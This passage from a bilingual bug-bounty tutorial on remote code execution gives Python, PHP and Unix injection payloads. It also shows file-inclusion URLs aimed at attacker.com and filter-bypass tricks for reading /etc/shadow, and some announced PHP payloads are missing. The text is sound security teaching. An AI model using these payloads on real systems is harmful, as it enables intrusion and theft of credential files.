parameters, and file uploads. Sometimes applications parse user-supplied
files and concatenate their contents unsafely into executed code, so any
input that is eventually passed into commands is something you should
look out for.
与发现其他漏洞一样，找到RCE的下一步是确定用户可以向应用程序提交输入的位置。在寻找代码注入时，要注意每个直接的用户输入位置，包括URL参数，HTTP头，正文参数和文件上传。有时，应用程序会解析用户提供的文件并不安全地将其内容连接到执行的代码中，因此您应该注意任何最终传递到命令中的输入。
To find potential file inclusion vulnerabilities, check for input
locations being used to determine filenames or paths, as well as any
file-upload functionalities in the application.
检查输入位置是否用于确定文件名或路径，以及应用程序中的任何文件上传功能，以查找潜在的文件包含漏洞。
### Step 3: Submit Test Payloads {#c18.xhtml#h2-501546c18-0005}
The next thing you should do is to submit test payloads to the
application. For code injection vulnerabilities, try payloads that are
meant to be interpreted by the server as code and see if they get
executed. For example, here's a list of payloads you could use:
接下来你需要做的事情是向应用程序提交测试负载。对于代码注入漏洞，试试那些被服务器解释为代码的负载，并看它们是否被执行。例如，以下是你可以使用的负载列表：
**Python payloads**
Python负载
This command is designed to print the string `      RCE test!     ` if
Python execution succeeds:
如果Python执行成功，则此命令旨在打印字符串\'RCE测试！\'：
    print("RCE test!")
This command prints the result of the system command `      ls     ` :
这个命令将打印出系统命令 \`ls\` 的结果：
    "__import__('os').system('ls')"
[ ]{#c18.xhtml#Page_290 .pagebreak title="290"} This command delays the
response for 10 seconds:
这个命令会将响应延迟10秒钟：
    "__import__('os').system('sleep 10')"
**PHP payloads**
PHP载荷
This command is designed to print the local PHP configuration
information if execution succeeds:
如果执行成功，该命令旨在打印本地PHP配置信息。
    phpinfo();
This command prints the result of the system command `      ls     ` :
该命令打印系统命令"ls"的结果： 这个命令打印出"ls"命令的结果。
This command delays the response for 10 seconds:
这个命令会延迟回应10秒钟：
**Unix payloads**
Unix载荷
This command prints the result of the system command `      ls     ` :
该命令会打印系统命令"ls"的结果：
    ;ls;
These commands delay the response for 10 seconds:
这些命令会延迟10秒钟的响应：
    | sleep 10;
    & sleep 10;
    ` sleep 10;`
    $(sleep 10)
For file inclusion vulnerabilities, you should try to make the endpoint
include either a remote file or a local file that you can control. For
example, for remote file inclusion, you could try several forms of a URL
that points to your malicious file hosted offsite:
对于文件包含漏洞，您应该尝试使终端点包含一个远程文件或本地文件，您可以控制。例如，对于远程文件包含，您可以尝试多种形式的URL，指向您位于外部托管的恶意文件。
    http://example.com/?page=http://attacker.com/malicious.php
    http://example.com/?page=http:attacker.com/malicious.php
And for local file inclusion vulnerabilities, try different URLs
pointing to local files that you control:
尝试不同的指向您控制的本地文件的URL，以处理本地文件包含漏洞问题：
    http://example.com/?page=../uploads/malicious.php
    http://example.com/?page=..%2fuploads%2fmalicious.php
You can use the protection-bypass techniques you learned in [ Chapter 13
]{.xref itemid="xref_target_Chapter 13"} to construct different forms of
the same URL.
你可以使用第13章中学到的保护绕过技巧来构建同一URL的不同形式。
### Step 4: Confirm the Vulnerability {#c18.xhtml#h2-501546c18-0006}
Finally, confirm the vulnerability by executing harmless commands like
`      whoami     ` , `      ls     ` , and `      sleep 5     ` .
最后，通过执行无害命令（例如whoami、ls和sleep 5）来确认漏洞。
## [ ]{#c18.xhtml#Page_291 .pagebreak title="291"} Escalating the Attack {#c18.xhtml#h1-501546c18-0004}
Be extra cautious when escalating RCE vulnerabilities. Most companies
would prefer that you don't try to escalate them at all because they
don't want someone poking around systems that contain confidential data.
During a typical penetration test, a hacker will often try to figure out
the privileges of the current user and attempt privilege-escalation
attacks after they gain RCE. But in a bug bounty context, this isn't
appropriate. You might accidentally read sensitive information about
customers or cause damage to the systems by modifying a critical file.
It's important that you carefully read the bounty program rules so you
don't cross the lines.
在升级RCE漏洞时要格外小心。大多数公司都希望您根本不要尝试升级它们，因为他们不希望有人在含机密数据的系统中进行探测。在典型的渗透测试中，黑客经常会尝试弄清当前用户的特权，并在获得RCE后尝试特权升级攻击。但在漏洞赏金的情况下，这是不合适的。您可能会意外读取客户的敏感信息，或通过修改关键文件来损坏系统。重要的是，您仔细阅读赏金计划规则，以免越界。
For classic RCEs, create a proof of concept that executes a harmless
command like `      whoami     ` or `      ls     ` . You can also prove
you've found an RCE by reading a common system file such as
*/etc/passwd* . You can use the `      cat     ` command to read a
system file:
针对经典的远程代码执行（RCE）漏洞，需创建一个可执行无害命令（如whoami或ls）的概念证明。也可通过读取常见系统文件（如/etc/passwd）来验证是否发现了RCE漏洞。可以使用cat命令来读取系统文件。
    cat /etc/passwd
On Linux systems, the */etc/passwd* file contains a list of the system's
accounts and their user IDs, group IDs, home directories, and default
shells. This file is usually readable without special privileges, so
it's a good file to try to access first.
在Linux系统中，/etc/passwd文件包含系统帐户及其用户ID、组ID、主目录和默认Shell的列表。这个文件通常可以在没有特殊权限的情况下进行读取，因此它是一个首要尝试访问的好文件。
Finally, you can create a file with a distinct filename on the system,
such as *rce_by_YOUR_NAME.txt* so it's clear that this file is a part of
your POC. You can use the `      touch     ` command to create a file
with the specified name in the current directory:
最后，您可以在系统上创建一个具有不同文件名的文件，例如rce_by_YOUR_NAME.txt，以便清楚表明该文件是您的POC的一部分。您可以使用touch命令在当前目录中创建具有指定名称的文件：
    touch rce_by_YOUR_NAME.txt
For blind RCEs, create a POC that executes the `      sleep     `
command. You can also create a reverse shell on the target machine that
connects back to your system for a more impactful POC. However, this is
often against program rules, so be sure to check with the program
beforehand.
针对盲目RCE漏洞，请创建一个执行睡眠命令的POC。你也可以在目标机器上创建一个反向shell，使其连接回你的系统，以创建一个更有影响力的POC。但是，这通常违反程序规则，所以请提前与程序确认。
It's easy to step over the bounds of the bounty policy and cause
unintended damage to the target site when creating POCs for RCE
vulnerabilities. When you create your POC, make sure that your payload
executes a harmless command and that your report describes the steps
needed to achieve RCE. Often, reading a nonsensitive file or creating a
file under a random path is enough to prove your findings.
在创建用于 RCE 漏洞的 POC
时，容易超出赏金政策的限制并对目标站点造成意外损害。创建您的 POC
时，请确保您的负载执行无害命令，并且您的报告描述了实现 RCE
的步骤。通常，阅读非敏感文件或在随机路径下创建文件就足以证明您的发现。
## Bypassing RCE Protection {#c18.xhtml#h1-501546c18-0005}
Many applications have caught on to the dangers of RCE and employ either
input validation or a firewall to stop potentially malicious requests.
But programming languages are often quite flexible, and that enables us
to work within the bounds of the input validation rules to make our
attack work! Here are some basic input validation bypasses you can try
in case the application is blocking your payloads.
许多应用程序已经意识到了RCE的危险，并采用输入验证或防火墙来阻止潜在的恶意请求。但是编程语言往往非常灵活，这使我们能够在输入验证规则范围内工作，以使我们的攻击有效！以下是一些基本的输入验证绕过方式，如果应用程序正在阻止您的有效载荷，请尝试。
[ ]{#c18.xhtml#Page_292 .pagebreak title="292"} For Unix system
commands, you can insert quotes and double quotes without changing the
command's behavior. You can also use wildcards to substitute for
arbitrary characters if the system is filtering out certain strings.
Finally, any empty command substitution results can be inserted into the
string without changing the results. For example, the following commands
will all print the contents of */etc/shadow* :
对于Unix系统命令，您可以插入引号和双引号，而不改变命令的行为。如果系统过滤某些字符串，还可以使用通配符替换任意字符。最后，任何空的命令替换结果都可以插入到字符串中，而不影响结果。例如，以下命令将打印/etc/shadow的内容。
    cat /etc/shadow
    cat "/e"tc'/shadow'
    cat /etc/sh*dow
    cat /etc/sha``dow
    cat /etc/sha$()dow
    cat /etc/sha${}dow
You can also vary the way you write the same command in PHP. For
example, PHP allows you to concatenate function names as strings. You
can even hex-encode function names, or insert PHP comments in commands
without changing their outcome:
你还可以变换PHP中编写同一命令的方式。例如，PHP允许你将函数名拼接为字符串。你甚至可以十六进制编码函数名称，或在命令中插入PHP注释而不影响命令结果。
    /* Text surrounded by these brackets are comments in PHP. */
For example, say you want to execute this system command in PHP:
例如，假设你想在 PHP 中执行这个系统命令：
    system('cat /etc/shadow');
The following example executes a `      system     ` command by
concatenating the strings `      sys     ` and `      tem     ` :
下面的示例通过连接字符串sys和tem来执行系统命令：
    ('sys'.'tem')('cat /etc/shadow');
The following example does the same thing but inserts a blank comment in
the middle of the command:
以下示例做同样的事情，但在命令中间插入了一个空白注释：
    system/**/('ls');
And this line of code is a hex-encoded version of the
`      system     ` command:
这行代码是系统命令的十六进制编码版本：
    '\x73\x79\x73\x74\x65\x6d'('ls');
Similar behavior exists in Python. The following are all equivalent in
Python syntax:
Python 中存在类似的行为。以下所有内容在 Python 语法中都是等价的：
    __import__('os').system('cat /etc/shadow')
    __import__('o'+'s').system('cat /etc/shadow')
    __import__('\x6f\x73').system('cat /etc/shadow')
Additionally, some servers concatenate the values of multiple parameters
that have the same name into a single value. In this case, you can split
[ ]{#c18.xhtml#Page_293 .pagebreak title="293"} malicious code into
chunks to bypass input validation. For example, if the firewall blocks
requests that contain the string `      system     ` , you can split
your RCE payload into chunks, like so:
此外，一些服务器将具有相同名称的多个参数的值连接成单个值。在这种情况下，您可以将恶意代码拆分成块以绕过输入验证。例如，如果防火墙阻止请求包含字符串"system"，您可以将RCE有效负载分成多个块，例如：
    GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
    Host: example.com
The parameters will get through the firewall without issue, since the